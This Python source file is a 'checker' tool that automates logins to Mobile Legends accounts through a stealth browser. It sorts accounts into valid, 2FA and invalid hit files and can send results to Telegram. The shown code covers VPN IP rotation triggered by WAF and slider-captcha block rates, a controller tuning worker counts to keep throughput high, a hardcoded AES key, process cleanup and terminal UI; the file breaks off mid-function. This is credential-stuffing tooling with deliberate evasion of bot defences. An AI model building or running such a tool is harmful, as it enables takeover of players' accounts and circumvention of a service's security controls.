# -*- coding: utf-8 -*-
# ============================================================================
#  MLBB Checker v9.0 VPN Edition — CloakBrowser 0.6.5 Keyless / System Chromium
#
#  Cross-platform : Windows, Linux, Termux (Native Bionic Chromium & proot-distro)
#  Network mode   : VPN-First (koordinasi gate/cooldown/rotasi IP via --vpn-cmd / --vpn-wait)
#  Slider solver  : CDP Touch Events (_human_drag + solve_waf)
# ============================================================================
import asyncio
import atexit
import argparse
import base64
import datetime
from collections import deque
import gc
import hashlib
import json
import math
import os
import platform
import random
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
import unicodedata
import zlib
# ponytail: unshadow stdlib http for urllib.request, then restore script dir so info.py imports
_script_dir = os.path.dirname(os.path.abspath(__file__))
_popped_cwd = False
if sys.path and os.path.abspath(sys.path[0]) == _script_dir:
    sys.path.pop(0)
    _popped_cwd = True
import urllib.parse
import urllib.request
if _popped_cwd:
    sys.path.insert(0, _script_dir)

# Global emergency PID tracker to prevent zombie processes (Cross-platform: Windows/Linux/Termux)
_driver_pid = None
_pw_instance = None
_lookup_exec = None

CLOAKBROWSER_LICENSE_KEY_DEFAULT = ""
os.environ["CLOAKBROWSER_CACHE_DIR"] = os.environ.get("CLOAKBROWSER_OLD_CACHE_DIR") or os.path.join(_script_dir, ".cloak_old_cache")
_CONFIGURED_LICENSE_KEY = ""
_ACTIVE_LICENSE_KEY = ""
_LICENSE_SESSION_ACTIVE = False

def _cloak_cache_dir() -> str:
    try:
        from cloakbrowser.config import get_cache_dir
        return str(get_cache_dir())
    except Exception:
        return os.environ.get("CLOAKBROWSER_CACHE_DIR") or os.path.join(os.path.expanduser("~"), ".cloakbrowser")

def activate_cloak_license(explicit_key: str = "") -> str:
    """Aktifkan license key CloakBrowser secara ephemeral untuk sesi run ini saja."""
    global _CONFIGURED_LICENSE_KEY, _ACTIVE_LICENSE_KEY, _LICENSE_SESSION_ACTIVE
    if explicit_key and explicit_key.strip():
        _CONFIGURED_LICENSE_KEY = explicit_key.strip()
    key = (_CONFIGURED_LICENSE_KEY or "").strip()
    if key:
        _ACTIVE_LICENSE_KEY = key
        os.environ["CLOAKBROWSER_LICENSE_KEY"] = key
        _LICENSE_SESSION_ACTIVE = True
    else:
        _ACTIVE_LICENSE_KEY = ""
        _LICENSE_SESSION_ACTIVE = False
        os.environ.pop("CLOAKBROWSER_LICENSE_KEY", None)
    return key

def withdraw_cloak_license() -> None:
    """Tarik license key & cache CloakBrowser dari device ini setelah run selesai."""
    global _ACTIVE_LICENSE_KEY, _LICENSE_SESSION_ACTIVE
    _ACTIVE_LICENSE_KEY = ""
    _LICENSE_SESSION_ACTIVE = False
    os.environ.pop("CLOAKBROWSER_LICENSE_KEY", None)
    cdir = _cloak_cache_dir()
    for fname in ("license.key", ".license_cache", ".license_cache.tmp", ".free_claim"):
        fp = os.path.join(cdir, fname)
        try:
            if os.path.exists(fp):
                os.unlink(fp)
        except Exception:
            pass

def _detect_platform() -> dict:
    is_win = (os.name == 'nt')
    termux_env = bool(os.environ.get('TERMUX_VERSION')) or ('/com.termux/' in os.environ.get('PREFIX', ''))
    termux_fs = os.path.exists('/data/data/com.termux/files/usr')
    has_os_rel = os.path.exists('/etc/os-release')
    is_android = ('ANDROID_ROOT' in os.environ) or termux_env or termux_fs
    is_termux_native = (not is_win) and (termux_env or termux_fs) and (not has_os_rel)
    is_proot = (not is_win) and is_android and has_os_rel
    shm_ok = is_win or (os.path.isdir('/dev/shm') and os.access('/dev/shm', os.W_OK))
    tag = 'Windows' if is_win else ('Termux-Native' if is_termux_native else ('Termux-Proot' if is_proot else 'Linux'))
    return {
        'is_win': is_win,
        'is_android': is_android,
        'is_termux_native': is_termux_native,
        'is_proot': is_proot,
        'shm_ok': shm_ok,
        'arch': (platform.machine() or '').lower(),
        'tag': tag,
    }

_PLAT = _detect_platform()
_USING_STEALTH_PATCH = False

def _find_system_chromium() -> str | None:
    prefix_bin = os.path.join(os.environ.get('PREFIX', '/data/data/com.termux/files/usr'), 'bin')
    cands = [
        os.environ.get('CHROMIUM_PATH', ''),
        os.environ.get('CLOAKBROWSER_BINARY_PATH', ''),
        shutil.which('chromium') or '',
        shutil.which('chromium-browser') or '',
        shutil.which('google-chrome') or '',
        os.path.join(prefix_bin, 'chromium'),
        os.path.join(prefix_bin, 'chromium-browser'),
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
    ]
    for cand in cands:
        if cand and os.path.isfile(cand):
            if _PLAT['is_win'] or os.access(cand, os.X_OK):
                return cand
    return None

def _acquire_instance_lock():
    """Cegah 2 proses checker VPN berjalan bersamaan di mesin yang sama."""
    import tempfile
    fh = None
    for lock_dir in (tempfile.gettempdir(), _script_dir):
        lock_path = os.path.join(lock_dir, "mlbb_old_vpn_checker.lock")
        try:
            fh = open(lock_path, "a+")
            break
        except OSError:
            fh = None
            continue
    if fh is None:
        raise RuntimeError("Tidak dapat membuka file lock checker.")
    try:
        if os.name == 'nt':
            import msvcrt
            # Lock byte offset 1024 so offset 0 stays readable by another instance for PID reporting
            fh.seek(1024)
            msvcrt.locking(fh.fileno(), msvcrt.LK_NBLCK, 1)
        else:
            import fcntl
            fcntl.flock(fh.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        fh.seek(0)
        fh.truncate()
        fh.write(f"{os.getpid():<16}")
        fh.flush()
        return fh
    except Exception as e:
        if isinstance(e, OSError):
            try:
                fh.close()
            except Exception:
                pass
            if getattr(e, 'errno', None) in (38, 95, 22):
                return None
        try:
            fh.seek(0)
            old_pid = fh.read(64).strip() or "?"
        except Exception:
            old_pid = "?"
        try:
            fh.close()
        except Exception:
            pass
        raise RuntimeError(f"Sudah ada instance browser.py aktif (PID {old_pid}). Hentikan dulu sebelum menjalankan yang baru.")

def _release_instance_lock(fh):
    if not fh:
        return
    try:
        if os.name == 'nt':
            import msvcrt
            fh.seek(1024)
            msvcrt.locking(fh.fileno(), msvcrt.LK_UNLCK, 1)
        else:
            import fcntl
            fcntl.flock(fh.fileno(), fcntl.LOCK_UN)
    except Exception:
        pass
    try:
        fh.close()
    except Exception:
        pass

def _proc_descendants(root_pid: int) -> list[int]:
    """Pure-Python /proc descendant walk so cleanup works without pkill/procps and kills grandchildren."""
    children: dict[int, list[int]] = {}
    try:
        for ent in os.listdir('/proc'):
            if not ent.isdigit():
                continue
            try:
                with open(f'/proc/{ent}/stat', 'r', encoding='ascii', errors='ignore') as f:
                    raw = f.read()
                rp = raw.rfind(')')
                if rp != -1:
                    ppid = int(raw[rp + 2:].split()[1])
                    children.setdefault(ppid, []).append(int(ent))
            except Exception:
                pass
    except Exception:
        return []
    order, stack, seen = [], [root_pid], {root_pid}
    while stack:
        cur = stack.pop()
        for ch in children.get(cur, ()):
            if ch not in seen:
                seen.add(ch)
                order.append(ch)
                stack.append(ch)
    return list(reversed(order))

_ovpn_pid = None

def _kill_pid_tree(pid: int | None):
    if not pid:
        return
    try:
        if os.name == 'nt':
            subprocess.run(["taskkill", "/F", "/T", "/PID", str(pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            descs = _proc_descendants(pid)
            try:
                pgid = os.getpgid(pid)
                if pgid != os.getpgrp():
                    os.killpg(pgid, signal.SIGKILL)
            except Exception:
                pass
            for ch in descs:
                try:
                    os.kill(ch, signal.SIGKILL)
                except Exception:
                    pass
            try:
                os.kill(pid, signal.SIGKILL)
            except Exception:
                pass
    except Exception:
        pass

def _kill_driver_tree():
    """Terminate tracked driver/browser PID tree without touching active OpenVPN."""
    global _driver_pid
    pid = _driver_pid
    _driver_pid = None
    _kill_pid_tree(pid)

def _kill_ovpn_tree():
    """Emergency-kill tracked OpenVPN PID tree on process exit."""
    global _ovpn_pid
    opid = _ovpn_pid
    _ovpn_pid = None
    _kill_pid_tree(opid)

def _emergency_cleanup():
    _kill_driver_tree()
    _kill_ovpn_tree()
    if _LICENSE_SESSION_ACTIVE:
        withdraw_cloak_license()

atexit.register(_emergency_cleanup)

def _signal_exit_handler(signum, _frame):
    raise SystemExit(128 + signum)

for _sig_name in ("SIGTERM", "SIGHUP", "SIGBREAK"):
    _sig = getattr(signal, _sig_name, None)
    if _sig is not None:
        try:
            signal.signal(_sig, _signal_exit_handler)
        except Exception:
            pass

_ORIG_ENC = (getattr(sys.stdout, 'encoding', None) or '').lower()
for _s in (sys.stdout, sys.stderr):
    try:
        if os.name == 'nt' or 'utf' in _ORIG_ENC:
            _s.reconfigure(encoding='utf-8', errors='backslashreplace')
        else:
            _s.reconfigure(errors='backslashreplace')
    except Exception:
        pass

# ── Dependencies ─────────────────────────────────────────────────────────────
_CLOAKBROWSER_AVAILABLE = False
launch_async = None
try:
    from cloakbrowser import launch_async as _cb_launch_async
    launch_async = _cb_launch_async
    _CLOAKBROWSER_AVAILABLE = True
except ImportError:
    pass

if _PLAT['is_termux_native'] or not _CLOAKBROWSER_AVAILABLE:
    try:
        from playwright.async_api import async_playwright as _pw_check  # noqa: F401
    except ImportError:
        if _PLAT['is_termux_native']:
            print("[!] Playwright belum terinstal di Termux. Jalankan: pip install playwright (atau gunakan proot-distro ubuntu)")
        else:
            print("[!] cloakbrowser/playwright belum terinstal: pip install cloakbrowser playwright")
        sys.exit(1)

try:
    from Crypto.Cipher import AES
except ImportError:
    print("[!] pycryptodome belum terinstal: pip install pycryptodome")
    sys.exit(1)

try:
    import colorama
    if hasattr(colorama, 'just_fix_windows_console'):
        colorama.just_fix_windows_console()
    else:
        colorama.init()
except Exception:
    pass

# ── Optional: info.py (Player profile lookup) ────────────────────────────────
INFO_OK = False
get_player_info = None
DeviceManager = None
INFO_IMPORT_ERR = None

try:
    from info import get_player_info as _gpi, DeviceManager as _DM
    get_player_info = _gpi
    DeviceManager = _DM
    INFO_OK = True
except Exception as _e:
    INFO_IMPORT_ERR = f"{type(_e).__name__}: {_e}"

# ── Paths & Globals ──────────────────────────────────────────────────────────
BASE         = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(BASE, '..'))
OUTPUT_DIR   = os.path.join(BASE, 'output')
DEVICES_FILE = os.path.join(BASE, 'devices.txt')
os.makedirs(OUTPUT_DIR, exist_ok=True)

LOGIN_PAGE   = 'https://mtacc.mobilelegends.com/v3.0/inapp/login-new'
API_URL      = 'https://mtpassapi.mobilelegends.com/mpass'  # NOTE: tidak dipakai langsung; respons ditangkap via page.on("response")

# Kunci kriptografi Moonton (dari module 284 / checker.js)
AES_KEY = b'9eecd7fdd903ad7d009d281a91619639'

# Telegram Config (Optional via ENV)
TG_TOKEN = os.environ.get('TG_TOKEN', '')
TG_CHAT  = os.environ.get('TG_CHAT', '')
TG_ON    = bool(TG_TOKEN and TG_CHAT)

# Defaults
HEADLESS             = True
NUM_CONTEXTS         = 1
TWO_TAB              = False
MAX_WAF_RETRY        = 2   # FIX: 4→2; worst-case 1 new context per akun, bukan 2
ACCOUNTS_PER_SESSION = 150  # FIX: 25→150; kurangi frekuensi full page reload (~17MB/reload)
DEBUG                = False
PROXY_ENABLED        = False
PROXY_FILE           = ''
PROXY_TEST_TIMEOUT   = 15

# FIX: Cache storage state browser agar aset CDN (alicdn, moontontech) tidak
# di-download ulang tiap new_context. File dihapus otomatis jika sudah > 1 hari.
CACHE_STATE_FILE     = os.path.join(BASE, '.browser_vpn_cache_state.json')

# Output files
FILES = {
    'VALID': 'hit_valid.txt',
    'OTP': 'hit_2fa.txt',
    'INVALID': 'invalid.txt',
    'ERR': 'err.txt'
}

# ── UI & Color Styling (universal terminal compatible) ───────────────────────
_IS_TTY = bool(getattr(sys.stdout, 'isatty', lambda: False)())
_TERM = os.environ.get('TERM', '').lower()
_NO_COLOR = bool(os.environ.get('NO_COLOR')) or _TERM == 'dumb'
_COLOR_OK = (not _NO_COLOR) and (_IS_TTY or bool(os.environ.get('FORCE_COLOR')))
if os.name == 'nt' and _COLOR_OK:
    os.system('')  # Enable VT100 on Windows conhost even without colorama
_TRUECOLOR = _COLOR_OK and (
    os.environ.get('COLORTERM', '').lower() in ('truecolor', '24bit')
    or bool(os.environ.get('WT_SESSION'))
)
_LC_RAW = (os.environ.get('LC_ALL') or os.environ.get('LC_CTYPE') or os.environ.get('LANG') or '').upper()
_LC = _LC_RAW.split('.')[0]
_POSIX_UTF_ENV = (os.name == 'nt') or ('UTF' in _LC_RAW) or (not _LC_RAW and 'utf' in _ORIG_ENC)
_UTF_OK = (
    not bool(os.environ.get('NO_UTF8'))
    and ('--ascii' not in sys.argv)
    and ('utf' in (getattr(sys.stdout, 'encoding', None) or '').lower())
    and _POSIX_UTF_ENV
    and _TERM not in ('linux', 'vt100', 'vt220', 'vt102', 'ansi', 'dumb', '')
    and _LC not in ('C', 'POSIX')
)

CYAN   = (75, 220, 255)
PURPLE = (175, 95, 255)
GREEN  = (80, 235, 155)
GOLD   = (255, 205, 80)
RED    = (255, 85, 105)
WHITE  = (238, 242, 255)
GRAY   = (125, 135, 160)
_ANSI16 = {
    CYAN: '\033[96m', PURPLE: '\033[95m', GREEN: '\033[92m',
    GOLD: '\033[93m', RED: '\033[91m', WHITE: '\033[97m', GRAY: '\033[90m',
}

RESET = '\033[0m' if _COLOR_OK else ''
DIM = '\033[2m' if _COLOR_OK else ''
BD = '\033[1m' if _COLOR_OK else ''
G = '\033[92m' if _COLOR_OK else ''
R = '\033[91m' if _COLOR_OK else ''
Y = '\033[93m' if _COLOR_OK else ''
W = '\033[0m' if _COLOR_OK else ''

def rgb(r, g, b):
    if not _COLOR_OK:
        return ''
    if _TRUECOLOR:
        return f"\033[38;2;{r};{g};{b}m"
    return _ANSI16.get((r, g, b), '')

def c(co): return rgb(*co)

BT, BTR, BBL, BBR, BH, BV, ST, STR, SBL, SBR, BAR_F, BAR_E, S_OK, S_ERR, S_STAR, S_ASK, S_YN = (
    ('╭', '╮', '╰', '╯', '─', '│', '┌', '┐', '└', '┘', '█', '░', '✓', '✗', '★', '◈', '❯')
    if _UTF_OK else
    ('+', '+', '+', '+', '-', '|', '+', '+', '+', '+', '#', '.', '+', 'x', '*', '>', '>')
)

def p_out(t, end="\n"):
    try:
        print(t, end=end, flush=True)
    except Exception:
        print(t.encode("ascii", "ignore").decode(), end=end, flush=True)

def clear_line():
    if _COLOR_OK:
        p_out("\033[2K\r", end="")
    elif _IS_TTY:
        p_out("\r", end="")

def now():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def dbg(msg):
    if DEBUG and not _TUI_ACTIVE:
        clear_line()
        clean = str(msg).strip()
        if len(clean) > 95:
            clean = clean[:92] + '...'
        p_out(f"  {c(GRAY)}[{now()[11:]}]{W} {clean}")
        print_progress()

def shortpath(path_str):
    try:
        r = os.path.relpath(path_str, BASE)
        return path_str if r.startswith("..") else r
    except Exception:
        return str(path_str)

stats = {
    'valid': 0, 'invalid': 0, 'otp': 0, 'error': 0, 'waf': 0,
    'checked': 0, 'total': 0, 'start': 0.0, 'waf_solved': 0,
    'proxy_ctx': 0,
    'rank_mythic': 0, 'rank_legend': 0, 'rank_epic': 0, 'rank_other': 0,
    'peak_skins': 0, 'peak_lvl': 0,
    'proxy_label': 'None', 'workers': 0, 'workers_total': 0, 'status': 'RUNNING',
    'bytes_used': 0,
}

_TUI_ACTIVE = False
_LAST_RENDER = 0.0
_LIVE_LOGS = deque(maxlen=14)
_TOP_HITS = []
_ANSI_RE = re.compile(r'\033\[[0-9;]*m')

class SmartController:
    """Otak utama stabilitas: telemetry rolling, AIMD worker governor, kalibrasi plateau, dan orkestrasi VPN/browser."""
    _LABELS = {
        'waf': ('WAF', 'Aliyun WAF/Slider'),
        'proxy': ('PROXY', 'Proxy Lag/Timeout'),
        'lock': ('LOCK', 'Tab/IPC/Gate Lock'),
        'lookup': ('LOOKUP', 'Info/TG Lookup'),
        'retry': ('RETRY', 'Retry Loop'),
    }

    def __init__(self, window_s: float = 30.0):
        self.window_s = window_s
        self._slot_cond: asyncio.Condition | None = None
        self.reset()

    def _get_slot_cond(self) -> asyncio.Condition:
        if self._slot_cond is None:
            self._slot_cond = asyncio.Condition()
        return self._slot_cond

    def reset(self, now_t: float | None = None):
        t = time.monotonic() if now_t is None else now_t
        self.start_t = t
        self.node_start_t = t
        self.last_check_t = t
        self.last_alert_t = 0.0
        self.pause_until_t = 0.0
        self.drop_since_t = 0.0
        self.last_heal_t = 0.0
        self.last_action_t = 0.0
        self.last_scale_t = t
        self.scale_up_cooldown_t = t + 20.0
        self.min_workers = 1
        self.target_workers = 1
        self.max_workers = 1
        self.auto_scale = False
        self.dead_workers: set[int] = set()
        self.last_up_ok_t = 0.0
        self.smart_note = 'INIT'
        self.total_checks = 0
        self.node_checks = 0
        self.node_waf = 0
        self.node_tmo = 0
        self.peak_rate = 0.0
        self.session_peak = 0.0
        self.was_drop = False
        self.samples: deque[float] = deque()
        self.stalls: deque[tuple[float, str, float]] = deque()
        self.latencies: deque[tuple[float, float]] = deque(maxlen=60)
        self.outcomes: deque[tuple[float, str]] = deque(maxlen=40)
        self.node_plateaus: deque[float] = deque(maxlen=3)
        self.totals: dict[str, float] = {k: 0.0 for k in self._LABELS}

    def configure_workers(self, min_w: int, start_w: int, max_w: int, auto_scale: bool, now_t: float | None = None):
        t = time.monotonic() if now_t is None else now_t
        self.min_workers = max(1, int(min_w))
        self.max_workers = max(self.min_workers, int(max_w))
        self.target_workers = max(self.min_workers, min(self.max_workers, int(start_w)))
        self.auto_scale = bool(auto_scale)
        self.last_scale_t = t
        self.scale_up_cooldown_t = t + 20.0
        self.smart_note = f"{self.target_workers}/{self.max_workers}w"

    def live_workers(self) -> int:
        return sum(1 for i in range(self.target_workers) if i not in self.dead_workers)

    def mark_worker_dead(self, wid: int):
        self.dead_workers.add(int(wid))
        stats['workers'] = self.live_workers()

    async def set_target_workers(self, new_w: int, note: str = '', now_t: float | None = None):
        clamped = max(self.min_workers, min(self.max_workers, int(new_w)))
        old_w = self.target_workers
        t = time.monotonic() if now_t is None else now_t
        if clamped != old_w:
            if clamped < old_w:
                ratio = clamped / max(1, old_w)
                if self.session_peak > 0:
                    self.session_peak *= ratio
                if self.peak_rate > 0:
                    self.peak_rate *= ratio
                self.pause_until_t = max(self.pause_until_t, t + 8.0)
                self.drop_since_t = 0.0
            self.target_workers = clamped
            self.last_scale_t = t
            stats['workers'] = self.live_workers()
        if note:
            self.smart_note = note
        if self._slot_cond is not None:
            async with self._slot_cond:
                self._slot_cond.notify_all()

    async def wait_for_slot(self, wid: int, stop_fn) -> bool:
        while self.target_workers > 0 and wid >= self.target_workers:
            if stop_fn():
                return False
            cond = self._get_slot_cond()
            async with cond:
                if wid < self.target_workers:
                    break
                try:
                    await asyncio.wait_for(cond.wait(), timeout=1.5)
                except asyncio.TimeoutError:
                    pass
        return not stop_fn()

    def current_node_summary(self, now_t: float | None = None) -> tuple[float, float, float]:
        t = time.monotonic() if now_t is None else now_t
        el = max(1.0, t - self.node_start_t)
        rate = self.node_checks / el
        bad = self.node_waf + self.node_tmo
        waf_ratio = bad / max(1, self.node_checks + bad)
        return rate, waf_ratio, el

    def resume(self, now_t: float | None = None):
        t = time.monotonic() if now_t is None else now_t
        # Kalibrasi plateau bila beberapa node berturut-turut sehat di rate konsisten
        n_el = t - self.node_start_t
        if n_el >= 18.0 and self.node_checks >= 12 and self.session_peak > 0:
            n_rate, n_waf, _ = self.current_node_summary(t)
            win_tot = sum(d for _, _, d in self.stalls)
            lock_tot = sum(d for _, k, d in self.stalls if k == 'lock')
            lock_pct = (lock_tot / win_tot) if win_tot > 0 else 0.0
            if n_waf < 0.20 and lock_pct < 0.15:
                self.node_plateaus.append(n_rate)
                if len(self.node_plateaus) == 3 and max(self.node_plateaus) < self.session_peak * 0.80:
                    self.session_peak = 0.85 * self.session_peak + 0.15 * max(self.node_plateaus)
                    self.node_plateaus.clear()
        self.node_start_t = t
        self.node_checks = 0
        self.node_waf = 0
        self.node_tmo = 0
        self.last_check_t = t
        self.pause_until_t = t + 10.0
        # ponytail: keep session_peak intact across rotations so repeated bad nodes never blind the detector
        self.peak_rate = 0.0
        self.drop_since_t = 0.0
        self.was_drop = False
        self.samples.clear()
        self.stalls.clear()
        self.outcomes.clear()

    def _prune(self, now_t: float):
        cut = now_t - self.window_s
        while self.samples and self.samples[0] < cut:
            self.samples.popleft()
        while self.stalls and self.stalls[0][0] < cut:
            self.stalls.popleft()
        cut_out = now_t - 45.0
        while self.outcomes and self.outcomes[0][0] < cut_out:
            self.outcomes.popleft()
        while self.latencies and self.latencies[0][0] < cut_out:
            self.latencies.popleft()

    def mark_check(self, now_t: float | None = None):
        t = time.monotonic() if now_t is None else now_t
        self.total_checks += 1
        self.node_checks += 1
        self.last_check_t = t
        self.samples.append(t)
        self._prune(t)
        if len(self.samples) >= 8:
            span = t - self.samples[0]
            if span >= 12.0:
                rate_now = (len(self.samples) - 1) / span
                self.peak_rate = max(self.peak_rate, rate_now)
                if len(self.samples) >= 14 and span >= 18.0:
                    self.session_peak = max(self.session_peak, rate_now)

    def on_outcome(self, kind: str, resp_dt: float = 0.0, now_t: float | None = None):
        t = time.monotonic() if now_t is None else now_t
        self.outcomes.append((t, kind))
        if resp_dt > 0.0 and kind == 'OK':
            self.latencies.append((t, resp_dt))
        if kind == 'WAF':
            self.node_waf += 1
        elif kind == 'TMO':
            self.node_tmo += 1
        self._prune(t)

    def adaptive_wait_s(self, req_dispatched: bool) -> float:
        if not req_dispatched:
            return 3.5
        if len(self.latencies) < 5:
            return 8.5
        vals = sorted(d for _, d in self.latencies)
        p95 = vals[min(len(vals) - 1, int(len(vals) * 0.95))]
        return max(4.5, min(9.0, p95 * 2.5))

    def record_stall(self, kind: str, dur_s: float, now_t: float | None = None):
        if dur_s < 0.25 or kind not in self.totals:
            return
        t = time.monotonic() if now_t is None else now_t
        self.stalls.append((t, kind, dur_s))
        self.totals[kind] += dur_s
        self._prune(t)

    def _dominant(self, by_kind: dict[str, float]) -> tuple[str, str, int]:
        tot = sum(by_kind.values())
        if tot < 1.5:
            return 'SLOW', 'Throughput Rendah', 0
        k, v = max(by_kind.items(), key=lambda kv: kv[1])
        tag, desc = self._LABELS.get(k, ('SLOW', 'Throughput Rendah'))
        return tag, desc, int(v * 100 / tot)

    def evaluate(self, now_t: float | None = None) -> tuple[bool, str, str, int, float, float]:
        t = time.monotonic() if now_t is None else now_t
        self._prune(t)
        elapsed = max(t - self.start_t, 0.0)
        idle_s = max(t - self.last_check_t, 0.0)
        # ponytail: 12s recent window detects drops fast & clears immediately after recovery instead of waiting 30s
        recent_span = min(12.0, max(elapsed, 1.0))
        recent_cut = t - 12.0
        recent_cnt = sum(1 for ts in self.samples if ts >= recent_cut)
        cur_rate = 0.0 if idle_s >= 15.0 else (recent_cnt / max(recent_span, 10.0))
        target_peak = max(self.peak_rate, self.session_peak * 0.85)
        warmed = self.total_checks >= 6 and elapsed >= 12.0 and target_peak > 0 and t >= self.pause_until_t
        is_drop = warmed and (cur_rate < target_peak * 0.58 or (idle_s >= 10.0 and stats.get('workers', 0) > 0))
        if is_drop:
            if self.drop_since_t == 0.0:
                self.drop_since_t = t
        elif warmed and target_peak > 0 and cur_rate >= target_peak * 0.70:
            self.drop_since_t = 0.0
        win_totals = {}
        for _, k, d in self.stalls:
            win_totals[k] = win_totals.get(k, 0.0) + d
        tag, desc, pct = self._dominant(win_totals)
        return is_drop, tag, desc, pct, cur_rate, target_peak

    def _window_ratios(self, now_t: float) -> tuple[int, float, float, float]:
        self._prune(now_t)
        n = len(self.outcomes)
        if n == 0:
            return 0, 0.0, 0.0, 0.0
        waf_r = sum(1 for _, k in self.outcomes if k == 'WAF') / n
        tmo_r = sum(1 for _, k in self.outcomes if k in ('TMO', 'NET')) / n
        win_tot = sum(d for _, _, d in self.stalls)
        lock_r = (sum(d for _, k, d in self.stalls if k == 'lock') / win_tot) if win_tot > 1.5 else 0.0
        return n, waf_r, tmo_r, lock_r

    def should_auto_heal(self, now_t: float | None = None, min_drop_s: float = 10.0, cooldown_s: float = 28.0) -> tuple[bool, str, float, float]:
        t = time.monotonic() if now_t is None else now_t
        is_drop, tag, _, _, cur_r, peak_r = self.evaluate(t)
        if not is_drop or peak_r < 0.6:
            return False, tag, cur_r, peak_r
        if t < (self.pause_until_t + 8.0) or (t - self.last_heal_t) < cooldown_s:
            return False, tag, cur_r, peak_r
        if self.drop_since_t <= 0.0 or (t - self.drop_since_t) < min_drop_s:
            return False, tag, cur_r, peak_r
        return True, tag, cur_r, peak_r

    def decide_action(self, avail_mb: float, can_rotate_vpn: bool, ctx_age: int,
                      is_recycling: bool, now_t: float | None = None,
                      ram_floor_mb: float = 360.0) -> tuple[str, dict]:
        """Satu keputusan terpusat per tick: RECYCLE_BROWSER / ROTATE_VPN / SCALE_UP / NONE."""
        t = time.monotonic() if now_t is None else now_t
        is_drop, tag, _, _, cur_r, peak_r = self.evaluate(t)
        n_out, waf_r, tmo_r, lock_r = self._window_ratios(t)

        # Global cooldown antar aksi berat
        if (t - self.last_action_t) < 6.0:
            return 'NONE', {}

        if not is_recycling and (
            (tag == 'LOCK' and is_drop and (t - self.last_heal_t) >= 25.0)
            or (ctx_age >= max(400, self.target_workers * 35) and (t - self.last_heal_t) >= 45.0)
        ):
            if (t - self.pause_until_t) >= 8.0:
                self.scale_up_cooldown_t = max(self.scale_up_cooldown_t, t + 25.0)
                return 'RECYCLE_BROWSER', {'cur_r': cur_r, 'peak_r': peak_r, 'reason': tag if is_drop else 'ctx_age'}

        # Degradasi VPN / WAF berat setelah cukup sampel -> rotasi VPN (hindari rotasi tiap 40s)
        if can_rotate_vpn and (t - self.pause_until_t) >= 22.0 and (t - self.last_heal_t) >= 45.0:
            bad_stat = (n_out >= 16 and (waf_r + tmo_r) >= 0.65)
            heal_drop, _, _, _ = self.should_auto_heal(t)
            if bad_stat or (heal_drop and tag != 'LOCK'):
                why = f"WAF/TMO {int((waf_r+tmo_r)*100)}%" if bad_stat else f"{cur_r:.2f}/{peak_r:.2f}/s ({tag})"
                return 'ROTATE_VPN', {'tag': tag, 'cur_r': cur_r, 'peak_r': peak_r, 'reason': why}

        # Kondisi sehat & masih di bawah max_workers -> coba scale up +1 bertahap
        if (
            self.auto_scale
            and self.target_workers < self.max_workers
            and not is_drop
            and self.total_checks >= 12
            and t >= (self.pause_until_t + 12.0)
            and t >= self.scale_up_cooldown_t
            and (t - self.last_scale_t) >= 25.0
            and waf_r < 0.12 and tmo_r < 0.08 and lock_r < 0.12
            and (avail_mb <= 0 or avail_mb >= ram_floor_mb + 290.0)
        ):
            self.last_up_ok_t = t
            return 'SCALE_UP', {'new_w': self.target_workers + 1, 'cur_r': cur_r}

        up_mark = '+' if (self.last_up_ok_t > 0 and (t - self.last_up_ok_t) < 15.0) else ''
        self.smart_note = f"{self.live_workers()}/{self.max_workers}w{up_mark} {cur_r:.1f}/s"
        return 'NONE', {}

    def maybe_alert(self, now_t: float | None = None) -> str | None:
        t = time.monotonic() if now_t is None else now_t
        is_drop, tag, desc, pct, cur_r, peak_r = self.evaluate(t)
        if is_drop:
            if not self.was_drop or (t - self.last_alert_t) >= 25.0:
                self.was_drop = True
                self.last_alert_t = t
                drop_pct = max(0, min(99, int((1.0 - cur_r / max(peak_r, 0.01)) * 100)))
                why = f"{desc} {pct}%" if pct else desc
                msg = f"DROP -{drop_pct}% ({cur_r:.2f} vs {peak_r:.2f}/s) -> {why}"
                _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}{msg[:54]}{W}")
                return msg
        elif self.was_drop and peak_r > 0 and cur_r >= peak_r * 0.72:
            self.was_drop = False
        return None

    def summary(self) -> str:
        tot = sum(self.totals.values())
        if tot < 3.0:
            return ""
        parts = [f"{self._LABELS[k][0]} {int(v * 100 / tot)}%" for k, v in sorted(self.totals.items(), key=lambda kv: -kv[1]) if v >= 1.0][:2]
        return " | ".join(parts)

_SpeedDetector = SmartController
_PERF = SmartController()

def _fmt_bytes(b: int) -> str:
    if b < 1024: return f"{b} B"
    if b < 1048576: return f"{b/1024:.1f} KB"
    if b < 1073741824: return f"{b/1048576:.2f} MB"
    return f"{b/1073741824:.2f} GB"

def _char_w(ch: str) -> int:
    if unicodedata.combining(ch):
        return 0
    return 2 if unicodedata.east_asian_width(ch) in ('W', 'F') else 1

def _vis_len(s: str) -> int:
    return sum(_char_w(ch) for ch in _ANSI_RE.sub('', s))

def _clip_ansi(s: str, w: int) -> str:
    if w <= 0 or _vis_len(s) <= w:
        return s if w > 0 else ''
    out, cur, i, has_ansi = [], 0, 0, False
    while i < len(s):
        m = _ANSI_RE.match(s, i)
        if m:
            out.append(m.group(0))
            has_ansi = True
            i = m.end()
            continue
        cw = _char_w(s[i])
        if cur + cw > w:
            break
        out.append(s[i])
        cur += cw
        i += 1
    if has_ansi and W:
        out.append(W)
    return ''.join(out)

def _pad(s: str, w: int) -> str:
    clipped = _clip_ansi(s, w)
    return clipped + (' ' * max(0, w - _vis_len(clipped)))

def _box_line(inner: str, w: int = 68, bc: tuple = RED) -> str:
    return f"{c(bc)}{BV}{W} {_pad(inner, max(1, w - 4))} {c(bc)}{BV}{W}"

def _print_box(title: str, lines: list[str], bc: tuple = CYAN, indent: str = "  ") -> None:
    cols = shutil.get_terminal_size((80, 24)).columns
    w = max(42, min(68, cols - len(indent) - 1))
    inner_w = w - 2
    if title:
        t_vis = f" {title} "
        tl = _vis_len(t_vis)
        left_d = max(1, (inner_w - tl) // 2) if tl < inner_w - 2 else 1
        right_d = max(1, inner_w - tl - left_d)
        top = f"{indent}{c(bc)}{BT}{BH * left_d}{W}{t_vis}{c(bc)}{BH * right_d}{BTR}{W}"
    else:
        top = f"{indent}{c(bc)}{BT}{BH * inner_w}{BTR}{W}"
    p_out("")
